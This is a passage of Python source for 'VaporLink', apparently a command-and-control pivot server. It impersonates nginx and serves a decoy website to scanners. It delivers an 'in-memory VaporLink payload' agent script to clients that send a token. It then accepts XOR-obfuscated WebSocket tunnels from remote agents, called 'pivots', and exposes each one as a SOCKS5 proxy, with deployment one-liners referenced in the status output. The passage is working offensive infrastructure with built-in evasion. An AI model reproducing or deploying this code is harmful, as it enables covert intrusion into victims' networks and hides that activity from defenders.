                    session.writer.write(encode_ws_frame(b"vl", 9))
                    await session.writer.drain()
        except Exception:
            pass

    async def _serve_web_request(self, writer: asyncio.StreamWriter, method: str, raw_path: str):
        if not self.config["web_server"]:
            writer.write(b"HTTP/1.1 404 Not Found\r\nServer: nginx\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            await writer.drain()
            return

        if method not in ("GET", "HEAD"):
            writer.write(b"HTTP/1.1 405 Method Not Allowed\r\nServer: nginx\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            await writer.drain()
            return

        url_path = urllib.parse.unquote(raw_path.split("?", 1)[0])
        ws_link = self.config["ws_link"]
        ws_endpoint_path = "/" + ws_link.split("/", 1)[1] if "/" in ws_link else "/api"

        if url_path.rstrip("/") == ws_endpoint_path.rstrip("/") and not os.path.isfile(os.path.join(self.web_root, url_path.lstrip("/"))):
            body = json.dumps({"status": "operational", "service": "edge-telemetry-gateway", "version": "2.4.1"}).encode("utf-8")
            hdr = (
                "HTTP/1.1 200 OK\r\n"
                "Server: nginx\r\n"
                "Content-Type: application/json; charset=utf-8\r\n"
                f"Content-Length: {len(body)}\r\n"
                "X-Content-Type-Options: nosniff\r\n"
                "Connection: close\r\n\r\n"
            ).encode("utf-8")
            writer.write(hdr if method == "HEAD" else hdr + body)
            await writer.drain()
            return

        clean_rel = url_path.lstrip("/")
        if not clean_rel or clean_rel.endswith("/"):
            clean_rel += "index.html"

        root_real = os.path.realpath(self.web_root)
        target_real = os.path.realpath(os.path.join(root_real, clean_rel))

        if not (target_real == root_real or target_real.startswith(root_real + os.sep)) or not os.path.isfile(target_real):
            not_found = b"<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1><hr><p>nginx</p></center></body></html>"
            hdr = (
                "HTTP/1.1 404 Not Found\r\n"
                "Server: nginx\r\n"
                "Content-Type: text/html; charset=utf-8\r\n"
                f"Content-Length: {len(not_found)}\r\n"
                "Connection: close\r\n\r\n"
            ).encode("utf-8")
            writer.write(hdr if method == "HEAD" else hdr + not_found)
            await writer.drain()
            return

        try:
            with open(target_real, "rb") as f:
                body = f.read()
            ctype = mimetypes.guess_type(target_real)[0] or "application/octet-stream"
            if ctype.startswith("text/") or ctype == "application/javascript":
                ctype += "; charset=utf-8"
            hdr = (
                "HTTP/1.1 200 OK\r\n"
                "Server: nginx\r\n"
                f"Content-Type: {ctype}\r\n"
                f"Content-Length: {len(body)}\r\n"
                "X-Content-Type-Options: nosniff\r\n"
                "X-Frame-Options: SAMEORIGIN\r\n"
                "Connection: close\r\n\r\n"
            ).encode("utf-8")
            writer.write(hdr if method == "HEAD" else hdr + body)
            await writer.drain()
        except Exception:
            writer.write(b"HTTP/1.1 500 Internal Server Error\r\nServer: nginx\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            await writer.drain()

    async def _close_session(self, session: VaporSession, reason: str = "Disconnected", send_exit: bool = False):
        if session.closed:
            return
        if send_exit and session.writer:
            try:
                await self._send_packet(session, 0, CMD_EXIT, b"")
            except Exception:
                pass
        session.closed = True
        self.sessions.pop(session.session_id, None)

        if session.dedicated_socks_server:
            try:
                session.dedicated_socks_server.close()
            except Exception:
                pass

        for fut in list(session.pending_connects.values()):
            if not fut.done():
                fut.set_result(False)
        session.pending_connects.clear()

        for sw in list(session.streams.values()):
            try:
                sw.close()
            except Exception:
                pass
        session.streams.clear()

        try:
            session.writer.close()
        except Exception:
            pass

        if self.primary_session_id == session.session_id:
            self.primary_session_id = next(iter(self.sessions), None)

        self.log("SESSION", f"Session {session.session_id} ({session.hostname} / {session.client_ip}) closed: {reason}")

    async def _handle_ws(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            raw_hdr = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=10.0)
        except Exception:
            writer.close()
            return

        lines = raw_hdr.decode("latin-1", "ignore").split("\r\n")
        if not lines or " " not in lines[0]:
            writer.close()
            return

        parts = lines[0].split(" ")
        method = parts[0].upper() if len(parts) > 0 else "GET"
        raw_path = parts[1] if len(parts) > 1 else "/"

        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        xff = headers.get("x-forwarded-for", "")
        peer = writer.get_extra_info("peername")
        client_ip = xff.split(",")[0].strip() if xff else (peer[0] if peer else "0.0.0.0")

        if self.is_ip_banned(client_ip):
            self.log("SECURITY", f"Rejected blacklisted IP: {client_ip}")
            writer.write(b"HTTP/1.1 403 Forbidden\r\nServer: nginx\r\nConnection: close\r\n\r\n")
            await writer.drain()
            writer.close()
            return

        client_token = headers.get("x-vapor-token", "")
        is_ws_upgrade = headers.get("upgrade", "").lower() == "websocket"
        is_stage_req = headers.get("x-vapor-mode") == "stage"

        # Normal HTTP browser/scanner visit -> Serve decoy website without strike-banning
        if not client_token and not is_ws_upgrade and not is_stage_req:
            await self._serve_web_request(writer, method, raw_path)
            if not raw_path.startswith("/favicon.ico"):
                self.log("INFO", f"Decoy Webserver served {method} {raw_path} to {client_ip}")
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            return

        auth_token = self.config["conn_token"]
        if not client_token or not hmac.compare_digest(client_token, auth_token):
            self.failed_attempts[client_ip] = self.failed_attempts.get(client_ip, 0) + 1
            strikes = self.failed_attempts[client_ip]
            self.log("SECURITY", f"Invalid X-Vapor-Token from {client_ip} (Strike {strikes}/3)")
            if strikes >= 3:
                self.ban_ip(client_ip, "Auto-ban: 3 failed X-Vapor-Token attempts")
            writer.write(b"HTTP/1.1 404 Not Found\r\nServer: nginx\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            await writer.drain()
            writer.close()
            return

        self.failed_attempts[client_ip] = 0

        # Built-in HTTP Payload Staging over the same endpoint
        if is_stage_req or not is_ws_upgrade:
            insecure = headers.get("x-vapor-ssl") == "0"
            body = self.build_agent_script(insecure=insecure)
            self.log("STAGER", f"Delivered in-memory VaporLink payload to {client_ip}")
            resp = (
                f"HTTP/1.1 200 OK\r\n"
                f"Server: nginx\r\n"
                f"Content-Type: text/plain; charset=utf-8\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Cache-Control: no-store\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("utf-8") + body
            writer.write(resp)
            await writer.drain()
            writer.close()
            return

        ws_key = headers.get("sec-websocket-key", "")
        if not ws_key:
            writer.close()
            return

        accept = base64.b64encode(
            hashlib.sha1((ws_key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
        ).decode()
        handshake = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Server: nginx\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
        )
        writer.write(handshake.encode("utf-8"))
        await writer.drain()

        agent_id = headers.get("x-vapor-agent", "").strip()
        hostname = headers.get("x-vapor-host", "").strip() or client_ip
        os_info = headers.get("x-vapor-os", "").strip() or "Unknown"
        source_type = "glycon_agent" if agent_id else "standalone"

        # If an existing session from the same agent_id (or same hostname+client_ip) exists, replace it cleanly
        for old_sid, old_sess in list(self.sessions.items()):
            if (agent_id and old_sess.agent_id == agent_id) or (not agent_id and old_sess.client_ip == client_ip and old_sess.hostname == hostname):
                await self._close_session(old_sess, "Reconnected / Replaced")

        session_id = "vl-" + secrets.token_hex(3)
        session = VaporSession(
            session_id=session_id,
            writer=writer,
            client_ip=client_ip,
            agent_id=agent_id,
            hostname=hostname,
            os_info=os_info,
            source_type=source_type
        )
        await self._allocate_dedicated_socks_server(session)
        self.sessions[session_id] = session
        if not self.primary_session_id or self.primary_session_id not in self.sessions:
            self.primary_session_id = session_id

        self.log(
            "AUTH",
            f"Authenticated pivot {session_id} from {hostname} ({client_ip}) [{source_type}] -> Dedicated SOCKS5 :{session.dedicated_socks_port}"
        )

        ping_task = asyncio.create_task(self._keepalive_ping(session))
        try:
            while not session.closed:
                msg = await read_ws_msg(reader, writer, session.lock)
                if msg is None:
                    break
                xor_key = self.config["xor_key"].encode("utf-8")
                msg = xor_data(msg, xor_key)
                if len(msg) < 5:
                    continue
                sid, cmd = struct.unpack(">IB", msg[:5])
                payload = msg[5:]
                if cmd == CMD_CONNECT_OK:
                    fut = session.pending_connects.get(sid)
                    if fut and not fut.done():
                        fut.set_result(True)
                elif cmd == CMD_CONNECT_FAIL:
                    fut = session.pending_connects.get(sid)
                    if fut and not fut.done():
                        fut.set_result(False)
                elif cmd == CMD_DATA:
                    session.bytes_rx += len(payload)
                    self.total_bytes_rx += len(payload)
                    sw = session.streams.get(sid)
                    if sw:
                        try:
                            sw.write(payload)
                            await sw.drain()
                        except Exception:
                            session.streams.pop(sid, None)
                            sw.close()
                elif cmd == CMD_CLOSE:
                    fut = session.pending_connects.pop(sid, None)
                    if fut and not fut.done():
                        fut.set_result(False)
                    sw = session.streams.pop(sid, None)
                    if sw:
                        sw.close()
        except Exception:
            pass
        finally:
            ping_task.cancel()
            await self._close_session(session, "Connection terminated")

    async def _start_servers_coro(self):
        await self._stop_servers_coro()
        cfg = self.config
        self.listener_error = None
        try:
            ssl_ctx = None
            if cfg["tls_enabled"] and os.path.isfile(cfg["ssl_cert"]) and os.path.isfile(cfg["ssl_key"]):
                ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                ssl_ctx.load_cert_chain(certfile=cfg["ssl_cert"], keyfile=cfg["ssl_key"])

            # Bind WS/WSS listener with automatic fallback if port is already occupied
            ws_port = cfg["ws_port"]
            for candidate_ws in [ws_port, 9443, 9444, 8444, 8001, 8002]:
                try:
                    self.ws_server = await asyncio.start_server(
                        self._handle_ws,
                        cfg["ws_ip"],
                        candidate_ws,
                        ssl=ssl_ctx
                    )
                    if candidate_ws != ws_port:
                        old_port_str = f":{ws_port}"
                        new_link = cfg["ws_link"].replace(old_port_str, f":{candidate_ws}") if old_port_str in cfg["ws_link"] else cfg["ws_link"]
                        cfg["ws_port"] = candidate_ws
                        cfg["ws_link"] = new_link
                        self.log("INFO", f"WS port {ws_port} was busy; automatically bound to {cfg['ws_ip']}:{candidate_ws}")
                    break
                except OSError as e:
                    if candidate_ws == 8002:
                        raise e
                    continue

            # Bind Primary SOCKS5 listener with automatic fallback if 1080 is occupied
            socks_port = cfg["socks_port"]
            for candidate_socks in [socks_port, 1080, 1085, 1086, 1088, 1090]:
                try:
                    self.primary_socks_server = await asyncio.start_server(
                        self._handle_primary_socks,
                        cfg["socks_ip"],
                        candidate_socks
                    )
                    if candidate_socks != socks_port:
                        cfg["socks_port"] = candidate_socks
                        self.log("INFO", f"SOCKS5 port {socks_port} was busy; automatically bound primary SOCKS5 to {cfg['socks_ip']}:{candidate_socks}")
                    break
                except OSError as e:
                    if candidate_socks == 1090:
                        raise e
                    continue

            self.running = True
            mode_str = "HTTPS/WSS" if ssl_ctx else "HTTP/WS"
            web_str = "ON" if cfg["web_server"] else "OFF"
            self.log(
                "INFO",
                f"VaporLink active — {mode_str} Listener: {cfg['ws_ip']}:{cfg['ws_port']} | Decoy Web: {web_str} | Primary SOCKS5: {cfg['socks_ip']}:{cfg['socks_port']}"
            )
        except Exception as e:
            self.running = False
            self.listener_error = str(e)
            self.log("SECURITY", f"Failed to bind VaporLink listeners: {e}")

    async def _stop_servers_coro(self):
        for sess in list(self.sessions.values()):
            await self._close_session(sess, "Server reloading")
        if self.ws_server:
            try:
                self.ws_server.close()
                await self.ws_server.wait_closed()
            except Exception:
                pass
            self.ws_server = None
        if self.primary_socks_server:
            try:
                self.primary_socks_server.close()
                await self.primary_socks_server.wait_closed()
            except Exception:
                pass
            self.primary_socks_server = None
        self.running = False

    def start_background_loop(self):
        if self.thread and self.thread.is_alive():
            return

        def _thread_main():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._start_servers_coro())
            self.loop.run_forever()

        self.thread = threading.Thread(target=_thread_main, name="VaporLinkServerThread", daemon=True)
        self.thread.start()

    def restart_listeners(self):
        self.config = self._load_config()
        if self.loop and self.loop.is_running():
            fut = asyncio.run_coroutine_threadsafe(self._start_servers_coro(), self.loop)
            try:
                fut.result(timeout=5.0)
            except Exception as e:
                self.log("SECURITY", f"Error restarting listeners: {e}")

    def kick_session(self, session_id: str) -> bool:
        sess = self.sessions.get(session_id)
        if not sess:
            return False
        if self.loop and self.loop.is_running():
            asyncio.run_coroutine_threadsafe(self._close_session(sess, "Kicked by operator", send_exit=True), self.loop)
        return True

    def set_primary_session(self, session_id: str) -> bool:
        if session_id not in self.sessions:
            return False
        self.primary_session_id = session_id
        sess = self.sessions[session_id]
        self.log("INFO", f"Primary SOCKS5 ({self.config['socks_ip']}:{self.config['socks_port']}) routed to {sess.hostname} ({sess.session_id})")
        return True

    def get_status(self, insecure_preview: bool = True) -> dict:
        cfg = self.config
        sessions_list = [
            s.to_dict(self.primary_session_id, cfg["socks_ip"], cfg["socks_port"])
            for s in self.sessions.values()
        ]
        active_streams = sum(s["active_streams"] for s in sessions_list)
        primary_sess = next((s for s in sessions_list if s["is_primary"]), None)
        scheme = "https" if cfg["tls_enabled"] else "http"
        host_part = cfg["ws_link"].split("/", 1)[0] if cfg["ws_link"] else f"{self._get_local_ip()}:{cfg['ws_port']}"
        decoy_url = f"{scheme}://{host_part}/"
        decoy_api_url = f"{scheme}://{cfg['ws_link']}"

        return {
            "running": self.running,
            "listener_error": self.listener_error,
            "connected": len(sessions_list) > 0,
            "session_count": len(sessions_list),
            "sessions": sessions_list,
            "primary_session": primary_sess,
            "active_streams": active_streams,
            "total_bytes_tx": self.total_bytes_tx,
            "total_bytes_rx": self.total_bytes_rx,
            "config": cfg,
            "decoy_url": decoy_url,
            "decoy_api_url": decoy_api_url,
            "banned_ips": self.get_banned_ips(),
            "logs": list(self.logs)[-80:],
            "oneliners": self.generate_oneliners(insecure=insecure_preview),
        }


VAPORLINK_MANAGER = VaporLinkManager()
